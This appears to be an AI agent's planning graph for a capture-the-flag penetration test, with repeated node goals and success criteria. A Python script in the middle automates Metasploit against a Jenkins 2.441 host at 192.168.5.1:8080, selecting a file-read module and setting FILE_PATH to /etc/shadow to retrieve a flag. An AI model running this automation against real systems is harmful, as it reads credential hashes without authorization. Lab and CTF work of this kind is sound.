nodes.expected_observation: Responsive in-scope addresses are identified, no responsive addresses are observed in the examined range, or discovery coverage is prevented by a connectivity limitation.
nodes.goal: Discover responsive candidate machines within the task-provided 192.168.5.0/24 scope. The supplied network observations show an active interface and a route covering this range, but no candidate hosts have yet been observed.
nodes.stop_condition: Finish when in-scope host discovery has usable coverage or a specific connectivity limitation is established.

nodes.expected_observation: An application fingerprint suitable for Metasploit module assessment is established, service evidence remains ambiguous after relevant identification, or necessary service observations are prevented by connectivity limitations.
nodes.goal: For the responsive in-scope candidates identified by host discovery, determine exposed services and interact with relevant services to identify the application and version evidence that can distinguish the vulnerable target.
nodes.stop_condition: Finish when an application fingerprint can guide module assessment or the available service-identification evidence is inconclusive or blocked.
nodes.success_criteria: Record the candidate address, observed service evidence, application identification and its confidence, or the specific limitation preventing identification.

nodes.expected_observation: One or more plausible modules and their prerequisites are identified, no applicable module is supported by the observed fingerprint, or required module-specific evidence cannot be obtained.
nodes.goal: Using an interactive Metasploit console, identify and assess modules relevant to the observed application's fingerprint and version. Use Metasploit's module discovery rather than SearchSploit, and record applicability evidence and required module inputs.
nodes.stop_condition: Finish when candidates are sufficiently characterized for an exploitation assessment, relevant module discovery yields no supported candidate, or a necessary prerequisite is blocked.

nodes.expected_observation: A usable session is established, assessed candidates do not establish a session, or a necessary configuration input or prerequisite cannot be obtained through supported evidence paths.
nodes.goal: For the identified in-scope target and Metasploit module candidates, assess appropriate configuration from the observed service evidence and test evidence-supported candidates to establish whether a usable target session is obtained. Preserve failure evidence and distinguish an unproductive candidate from an unavailable prerequisite.
nodes.stop_condition: Finish when a usable session is available or the relevant identified candidates and their observable outcomes have been assessed.
nodes.success_criteria: Record session evidence sufficient to identify the target and its access context, or evidence explaining why the assessed candidates did not establish access or why the work is blocked.

nodes.expected_observation: The requested flag is observed in the specified file, the file or flag cannot be verified from available session evidence, or a necessary access prerequisite is blocked.
nodes.goal: Using the established session on the in-scope target, obtain and verify the requested CTF flag from the target's /etc/shadow file, limiting inspection to the requested evidence.
nodes.stop_condition: Finish when the flag is verified or the available evidence establishes an inconclusive result or a specific access limitation.
nodes.success_criteria: Record evidence that the requested flag value was present in /etc/shadow on the identified target.

nodes.expected_observation: Host discovery evidence shows no responsive in-scope candidates, or coverage is insufficient to determine whether candidates exist.
nodes.goal: Record that the available discovery did not identify a responsive candidate within the specified range; this does not establish that the target is absent or that all discovery methods have been exhausted.
nodes.stop_condition: Finish this outcome path after recording the discovery limitation.
nodes.success_criteria: Preserve the negative or inconclusive discovery evidence without asserting task completion.

nodes.stop_condition: Finish this outcome path when available identification evidence is recorded as inconclusive.
nodes.success_criteria: Preserve the observed service evidence and its coverage limitations without claiming the target or application is absent.

nodes.expected_observation: A specific service-access or connectivity limitation is observed.
nodes.goal: Record that a necessary connectivity prerequisite prevents obtaining service-identification evidence from the responsive candidate.
nodes.stop_condition: Finish this outcome path once the service-observation block is documented.
nodes.success_criteria: Document the prerequisite that cannot currently be obtained through supported paths.

nodes.expected_observation: Relevant Metasploit module discovery yields no applicable candidate, or available fingerprint evidence is insufficient to assess applicability.

nodes.stop_condition: Finish this outcome path after recording the inconclusive module assessment.
nodes.success_criteria: Preserve the fingerprint, module-discovery coverage, and remaining uncertainty.

nodes.expected_observation: A concrete unavailable module-specific input or prerequisite prevents further assessment.

nodes.stop_condition: Finish this outcome path when the module-assessment block is documented.
nodes.success_criteria: Document the missing necessary input or prerequisite and its effect on the assessment.

nodes.expected_observation: Candidate assessment fails to establish a session or session evidence is insufficient to confirm usable target access.

nodes.stop_condition: Finish this outcome path when the assessed candidate results are recorded.
nodes.success_criteria: Preserve candidate outcomes and the remaining uncertainty without claiming task completion.

nodes.expected_observation: A concrete unavailable configuration input or prerequisite prevents the candidate assessment from proceeding.
nodes.goal: Record that a necessary input or prerequisite for assessing the identified exploit candidates cannot currently be obtained through supported evidence paths.
nodes.stop_condition: Finish this outcome path when the exploit-assessment block is documented.
nodes.success_criteria: Document the unavailable necessary input or prerequisite and why it prevents further assessment.

nodes.expected_observation: Evidence confirms the requested flag value is present in the specified target file.

nodes.stop_condition: Finish this outcome path once flag verification is established.

nodes.expected_observation: Evidence identifies a usable Jenkins endpoint and its configuration details, or the discovery results leave the endpoint or required details uncertain.
nodes.goal: Use the existing observations for the in-scope host 192.168.5.1, including the reported Jenkins 2.441 service, to obtain any missing endpoint details needed to configure the identified Metasploit candidates. Reuse existing port or URI evidence when present; otherwise perform focused service discovery only against 192.168.5.1 and inspect identified HTTP endpoints. Do not test the Jenkins CLI deserialization candidate whose stated version range excludes 2.441.
nodes.stop_condition: Finish after existing evidence is checked and any needed focused endpoint discovery has returned its results.
nodes.success_criteria: Record the provenance and actual service/HTTP observations, including port and context path when observed, and distinguish absent responses from incomplete or failed discovery.

nodes.expected_observation: A usable target session is established, the requested file content is returned, candidates produce definitive negative results, or one or more candidate results/configuration prerequisites remain inconclusive or unavailable.
nodes.goal: Using the observed Jenkins endpoint and the candidate metadata supplied by the parent, assess the Jenkins metaprogramming RCE candidate and the identified Jenkins arbitrary-file-read candidate. In an interactive Metasploit console, configure only options supported by the observed endpoint and candidate metadata, assess/test the RCE candidate for a usable target session, and assess/test the file-read candidate for the task-requested /etc/shadow content. Preserve separate outcomes for each candidate; do not guess a module identifier or infer a session from file-read output.
nodes.stop_condition: Finish when both evidence-supported candidates have observable outcomes, or when a necessary configuration input prevents their assessment and the supported endpoint discovery has provided no way to obtain it.
nodes.success_criteria: Capture the selected module identities, configuration evidence, actual Metasploit responses, and session identity/access context if a session is obtained. Treat /etc/shadow content as file-read evidence, not session evidence; report the CTF flag only if its content is actually observed. A definitive negative applies only to the candidate tested and does not establish that all methods are exhausted.

nodes.expected_observation: The available service evidence does not provide a sufficiently usable endpoint or required configuration details.
nodes.goal: Record that the endpoint details needed to configure the identified candidates remain uncertain after checking supplied observations and performing the supported focused discovery; do not treat this as proof that all access methods fail.
nodes.stop_condition: End this local path with the unresolved endpoint evidence.
nodes.success_criteria: Preserve the discovery coverage and uncertainty without claiming task-wide exhaustion.

nodes.expected_observation: At least one candidate produces direct evidence of a usable session or returns the requested file content; preserve any other candidate's result as well.
nodes.goal: Record the observed usable session and/or verified /etc/shadow file-read result from the tested candidates, preserving which candidate produced each result. A file read is not a session, and a session alone does not establish that the requested flag was read.
nodes.stop_condition: End this local path once the observed access evidence is recorded.
nodes.success_criteria: For a session, record evidence identifying the target and access context. For file-read success, retain the actual returned content and identify the flag only when it is present in that content. This terminal reports local candidate evidence and does not imply other outcomes that were not observed.

nodes.expected_observation: Both candidate assessments have sufficiently definitive responses to explain why they did not establish the relevant access.
nodes.goal: Record definitive outcomes showing that the tested evidence-supported candidates did not establish a usable session or return the requested /etc/shadow content. Limit the conclusion to those candidates and observations.
nodes.stop_condition: End this local path when the definitive candidate outcomes are documented.
nodes.success_criteria: Preserve each candidate's actual response and distinguish a confirmed negative from an error or incomplete result. Do not characterize this local result as exhaustion of all possible methods or as completion of the original flag objective.

nodes.expected_observation: One or more candidate outcomes are ambiguous, failed to return interpretable evidence, or were not assessed, and no observed session or requested file content establishes access.
nodes.goal: Record candidate results that do not establish access but are inconclusive, incomplete, or include an unassessed candidate; retain the reason and what remains unknown.
nodes.stop_condition: End this local path with unresolved candidate evidence.
nodes.success_criteria: Describe uncertainty at the candidate and output granularity actually observed; do not infer that alternatives are exhausted.

nodes.expected_observation: Evidence identifies a usable Jenkins endpoint and its configuration details, or the discovery results leave the endpoint or required details uncertain.
nodes.goal: Use the existing observations for the in-scope host 192.168.5.1, including the reported Jenkins 2.441 service, to obtain any missing endpoint details needed to configure the identified Metasploit candidates. Reuse existing port or URI evidence when present; otherwise perform focused service discovery only against 192.168.5.1 and inspect identified HTTP endpoints. nodes.stop_condition: Finish after existing evidence is checked and any needed focused endpoint discovery has returned its results.
nodes.success_criteria: Record the provenance and actual service/HTTP observations, including port and context path when observed, and distinguish absent responses from incomplete or failed discovery.

nodes.expected_observation: A usable target session is established, the requested file content is returned, candidates produce definitive negative results, or one or more candidate results/configuration prerequisites remain inconclusive or unavailable.
nodes.goal: Using the observed Jenkins endpoint and the candidate metadata supplied by the parent, assess the Jenkins metaprogramming RCE candidate and the identified Jenkins arbitrary-file-read candidate. In an interactive Metasploit console, configure only options supported by the observed endpoint and candidate metadata, assess/test the RCE candidate for a usable target session, and assess/test the file-read candidate for the task-requested /etc/shadow content. Preserve separate outcomes for each candidate; do not guess a module identifier or infer a session from file-read output.
nodes.stop_condition: Finish when both evidence-supported candidates have observable outcomes, or when a necessary configuration input prevents their assessment and the supported endpoint discovery has provided no way to obtain it.
nodes.success_criteria: Capture the selected module identities, configuration evidence, actual Metasploit responses, and session identity/access context if a session is obtained. Treat /etc/shadow content as file-read evidence, not session evidence; report the CTF flag only if its content is actually observed. A definitive negative applies only to the candidate tested and does not establish that all methods are exhausted.

nodes.expected_observation: The available service evidence does not provide a sufficiently usable endpoint or required configuration details.
nodes.goal: Record that the endpoint details needed to configure the identified candidates remain uncertain after checking supplied observations and performing the supported focused discovery; do not treat this as proof that all access methods fail.
nodes.stop_condition: End this local path with the unresolved endpoint evidence.
nodes.success_criteria: Preserve the discovery coverage and uncertainty without claiming task-wide exhaustion.

nodes.expected_observation: At least one candidate produces direct evidence of a usable session or returns the requested file content; preserve any other candidate's result as well.
nodes.goal: Record the observed usable session and/or verified /etc/shadow file-read result from the tested candidates, preserving which candidate produced each result. A file read is not a session, and a session alone does not establish that the requested flag was read.
nodes.stop_condition: End this local path once the observed access evidence is recorded.
nodes.success_criteria: For a session, record evidence identifying the target and access context. For file-read success, retain the actual returned content and identify the flag only when it is present in that content. This terminal reports local candidate evidence and does not imply other outcomes that were not observed.

nodes.expected_observation: Both candidate assessments have sufficiently definitive responses to explain why they did not establish the relevant access.
nodes.goal: Record definitive outcomes showing that the tested evidence-supported candidates did not establish a usable session or return the requested /etc/shadow content. Limit the conclusion to those candidates and observations.
nodes.stop_condition: End this local path when the definitive candidate outcomes are documented.
nodes.success_criteria: Preserve each candidate's actual response and distinguish a confirmed negative from an error or incomplete result. Do not characterize this local result as exhaustion of all possible methods or as completion of the original flag objective.

nodes.expected_observation: One or more candidate outcomes are ambiguous, failed to return interpretable evidence, or were not assessed, and no observed session or requested file content establishes access.
nodes.goal: Record candidate results that do not establish access but are inconclusive, incomplete, or include an unassessed candidate; retain the reason and what remains unknown.
nodes.stop_condition: End this local path with unresolved candidate evidence.
nodes.success_criteria: Describe uncertainty at the candidate and output granularity actually observed; do not infer that alternatives are exhausted.

nodes.expected_observation: Evidence identifies a usable Jenkins endpoint and its configuration details, or the discovery results leave the endpoint or required details uncertain.
nodes.goal: Use the existing observations for the in-scope host 192.168.5.1, including the reported Jenkins 2.441 service, to obtain any missing endpoint details needed to configure the identified Metasploit candidates. Reuse existing port or URI evidence when present; otherwise perform focused service discovery only against 192.168.5.1 and inspect identified HTTP endpoints. Do not test the Jenkins CLI deserialization candidate whose stated version range excludes 2.441.
nodes.stop_condition: Finish after existing evidence is checked and any needed focused endpoint discovery has returned its results.
nodes.success_criteria: Record the provenance and actual service/HTTP observations, including port and context path when observed, and distinguish absent responses from incomplete or failed discovery.

nodes.expected_observation: A usable target session is established, the requested file content is returned, candidates produce definitive negative results, or one or more candidate results/configuration prerequisites remain inconclusive or unavailable.
nodes.goal: Using the observed Jenkins endpoint and the candidate metadata supplied by the parent, assess the Jenkins metaprogramming RCE candidate and the identified Jenkins arbitrary-file-read candidate. In an interactive Metasploit console, configure only options supported by the observed endpoint and candidate metadata, assess/test the RCE candidate for a usable target session, and assess/test the file-read candidate for the task-requested /etc/shadow content. Preserve separate outcomes for each candidate; do not guess a module identifier or infer a session from file-read output.
nodes.stop_condition: Finish when both evidence-supported candidates have observable outcomes, or when a necessary configuration input prevents their assessment and the supported endpoint discovery has provided no way to obtain it.
nodes.success_criteria: Capture the selected module identities, configuration evidence, actual Metasploit responses, and session identity/access context if a session is obtained. Treat /etc/shadow content as file-read evidence, not session evidence; report the CTF flag only if its content is actually observed. A definitive negative applies only to the candidate tested and does not establish that all methods are exhausted.

nodes.expected_observation: The available service evidence does not provide a sufficiently usable endpoint or required configuration details.
nodes.goal: Record that the endpoint details needed to configure the identified candidates remain uncertain after checking supplied observations and performing the supported focused discovery; do not treat this as proof that all access methods fail.
nodes.stop_condition: End this local path with the unresolved endpoint evidence.
nodes.success_criteria: Preserve the discovery coverage and uncertainty without claiming task-wide exhaustion.

nodes.expected_observation: At least one candidate produces direct evidence of a usable session or returns the requested file content; preserve any other candidate's result as well.
nodes.goal: Record the observed usable session and/or verified /etc/shadow file-read result from the tested candidates, preserving which candidate produced each result. A file read is not a session, and a session alone does not establish that the requested flag was read.
nodes.stop_condition: End this local path once the observed access evidence is recorded.
nodes.success_criteria: For a session, record evidence identifying the target and access context. For file-read success, retain the actual returned content and identify the flag only when it is present in that content. This terminal reports local candidate evidence and does not imply other outcomes that were not observed.

nodes.expected_observation: Both candidate assessments have sufficiently definitive responses to explain why they did not establish the relevant access.
nodes.goal: Record definitive outcomes showing that the tested evidence-supported candidates did not establish a usable session or return the requested /etc/shadow content. Limit the conclusion to those candidates and observations.
nodes.stop_condition: End this local path when the definitive candidate outcomes are documented.
nodes.success_criteria: Preserve each candidate's actual response and distinguish a confirmed negative from an error or incomplete result. Do not characterize this local result as exhaustion of all possible methods or as completion of the original flag objective.

nodes.expected_observation: One or more candidate outcomes are ambiguous, failed to return interpretable evidence, or were not assessed, and no observed session or requested file content establishes access.
nodes.goal: Record candidate results that do not establish access but are inconclusive, incomplete, or include an unassessed candidate; retain the reason and what remains unknown.
nodes.stop_condition: End this local path with unresolved candidate evidence.
nodes.success_criteria: Describe uncertainty at the candidate and output granularity actually observed; do not infer that alternatives are exhausted.

nodes.expected_observation: No candidate can be meaningfully assessed because a necessary input or prerequisite is unavailable through the supported paths used in this graph.
nodes.goal: Record that candidate testing could not proceed because necessary configuration inputs or prerequisites remain unobtainable after the supplied evidence and supported endpoint discovery.
nodes.stop_condition: End this local path when the necessary unavailable input is documented.
nodes.success_criteria: Identify the specific missing input or prerequisite and the discovery evidence supporting its unavailability; do not treat an unknown input alone as a blocker.

import json
import re
import sys

try:
    from framework_evidence import run_tool
except Exception as exc:
    print(json.dumps({"stage": "helper_import", "status": "error", "error": repr(exc)}, sort_keys=True))
    sys.exit(1)


def call_msf(commands):
    argv = ["msfconsole", "-q", "-x", commands]
    try:
        result = run_tool(argv)
        print(json.dumps({"stage": "metasploit", "argv": argv, "evidence_envelope": result}, sort_keys=True, default=str), flush=True)
        return result
    except Exception as exc:
        print(json.dumps({"stage": "metasploit", "argv": argv, "status": "error", "error": repr(exc)}, sort_keys=True), flush=True)
        return None


def get_stdout(envelope):
    if isinstance(envelope, dict):
        runs = envelope.get("tool_runs")
        if isinstance(runs, list):
            return "\n".join(str(run.get("stdout", "")) for run in runs if isinstance(run, dict))
        if isinstance(envelope.get("stdout"), str):
            return envelope["stdout"]
    return ""


print(json.dumps({
    "stage": "prior_candidate_evidence",
    "target": "192.168.5.1:8080",
    "endpoint": "http://192.168.5.1:8080/",
    "jenkins_version": "2.441",
    "rce_candidate": {
        "module": "exploit/multi/http/jenkins_metaprogramming",
        "prior_observation": "Previously tested against 192.168.5.1:8080; Metasploit reported the target was not exploitable and no session was created.",
        "this_action": "Not repeated; no new evidence warrants retesting."
    },
    "file_read_candidate": "Not yet tested; identify from runtime Metasploit search and module options."
}, sort_keys=True), flush=True)

search_envelope = call_msf("search jenkins; exit")
search_text = get_stdout(search_envelope)
module_names = []
for line in search_text.splitlines():
    match = re.match(r"^\s*\d+\s+((?:auxiliary|exploit|post|evasion|payload)/[A-Za-z0-9_./-]+)", line)
    if match:
        name = match.group(1)
        if name not in module_names:
            module_names.append(name)

if not module_names:
    print(json.dumps({"stage": "candidate_identification", "status": "inconclusive", "detail": "Metasploit search output did not yield parseable module identities; no module was guessed or run.", "search_stdout": search_text}, sort_keys=True), flush=True)
    sys.exit(0)

matching = []
for module in module_names:
    commands = "use " + module + "; show options; info; back; exit"
    envelope = call_msf(commands)
    text = get_stdout(envelope)
    has_file_path = re.search(r"(?im)^\s*FILE_PATH\s+", text) is not None
    describes_file_read = "file" in text.lower() and "read" in text.lower()
    if has_file_path and describes_file_read:
        matching.append({"module": module, "inspection_stdout": text})

if len(matching) != 1:
    print(json.dumps({
        "stage": "candidate_identification",
        "status": "inconclusive" if matching else "no_supported_candidate_identified",
        "matches": [item["module"] for item in matching],
        "detail": "A candidate must expose FILE_PATH and its inspected metadata must support file reading. No candidate was run unless exactly one matched; ambiguous or absent matches remain unresolved."
    }, sort_keys=True), flush=True)
    sys.exit(0)

module = matching[0]["module"]
print(json.dumps({
    "stage": "selected_file_read_candidate",
    "module": module,
    "selection_basis": "Runtime Metasploit module inspection exposed FILE_PATH and described file-reading behavior.",
    "configuration_evidence": {
        "RHOSTS": "192.168.5.1 (observed in-scope Jenkins endpoint)",
        "RPORT": "8080 (observed open Jenkins HTTP endpoint)",
        "TARGETURI": "/ (observed successful root request with no additional context path)",
        "FILE_PATH": "/etc/shadow (requested path and supported module option)"
    }
}, sort_keys=True), flush=True)

commands = (
    "use " + module +
    "; set RHOSTS 192.168.5.1" +
    "; set RPORT 8080" +
    "; set TARGETURI /" +
    "; set FILE_PATH /etc/shadow" +
    "; show options" +
    "; run" +
    "; sessions -l" +
    "; exit"
)
run_envelope = call_msf(commands)
run_text = get_stdout(run_envelope)
flag_patterns = [r"(?i)\bflag\{[^}\r\n]+\}", r"(?i)\bctf\{[^}\r\n]+\}"]
flags = []
for pattern in flag_patterns:
    flags.extend(re.findall(pattern, run_text))
print(json.dumps({
    "stage": "file_read_assessment",
    "module": module,
    "result_status": "tool_output_recorded" if run_envelope is not None else "tool_error",
    "file_content_evidence": "See the actual Metasploit run stdout in the evidence envelope above; file contents are not session evidence.",
    "session_evidence": "Assess only from the actual sessions -l output in the evidence envelope; no session is inferred from file contents.",
    "observed_flag_like_strings": sorted(set(flags)),
    "interpretation_note": "A flag is reportable only if actually present in returned content. A successful command or file-read response alone does not establish a target session."
}, sort_keys=True), flush=True)

nodes.stop_condition: End this local path when the definitive candidate outcomes are documented.

nodes.stop_condition: End this local path with unresolved candidate evidence.
nodes.success_criteria: Describe uncertainty at the candidate and output granularity actually observed; do not infer that alternatives are exhausted.

nodes.expected_observation: Responsive in-scope addresses are identified, no responsive addresses are observed in the examined range, or discovery coverage is prevented by a connectivity limitation.

nodes.success_criteria: Record discovery evidence and coverage for the specified range, sufficient to determine whether in-scope candidates can be examined further.

nodes.expected_observation: An application fingerprint suitable for Metasploit module assessment is established, service evidence remains ambiguous after relevant identification, or necessary service observations are prevented by connectivity limitations.
nodes.goal: For the responsive in-scope candidates identified by host discovery, determine exposed services and interact with relevant services to identify the application and version evidence that can distinguish the vulnerable target.
nodes.stop_condition: Finish when an application fingerprint can guide module assessment or the available service-identification evidence is inconclusive or blocked.
nodes.success_criteria: Record the candidate address, observed service evidence, application identification and its confidence, or the specific limitation preventing identification.

nodes.expected_observation: One or more plausible modules and their prerequisites are identified, no applicable module is supported by the observed fingerprint, or required module-specific evidence cannot be obtained.
nodes.goal: Using an interactive Metasploit console, identify and assess modules relevant to the observed application's fingerprint and version. Use Metasploit's module discovery rather than SearchSploit, and record applicability evidence and required module inputs.
nodes.stop_condition: Finish when candidates are sufficiently characterized for an exploitation assessment, relevant module discovery yields no supported candidate, or a necessary prerequisite is blocked.
nodes.success_criteria: Record the relevant module candidates, the evidence supporting or contradicting applicability, and the required inputs or prerequisite limitations.

nodes.expected_observation: A usable session is established, assessed candidates do not establish a session, or a necessary configuration input or prerequisite cannot be obtained through supported evidence paths.
nodes.goal: For the identified in-scope target and Metasploit module candidates, assess appropriate configuration from the observed service evidence and test evidence-supported candidates to establish whether a usable target session is obtained. Preserve failure evidence and distinguish an unproductive candidate from an unavailable prerequisite.
nodes.stop_condition: Finish when a usable session is available or the relevant identified candidates and their observable outcomes have been assessed.
nodes.success_criteria: Record session evidence sufficient to identify the target and its access context, or evidence explaining why the assessed candidates did not establish access or why the work is blocked.

nodes.expected_observation: The requested flag is observed in the specified file, the file or flag cannot be verified from available session evidence, or a necessary access prerequisite is blocked.

nodes.stop_condition: Finish when the flag is verified or the available evidence establishes an inconclusive result or a specific access limitation.
nodes.success_criteria: Record evidence that the requested flag value was present in /etc/shadow on the identified target.
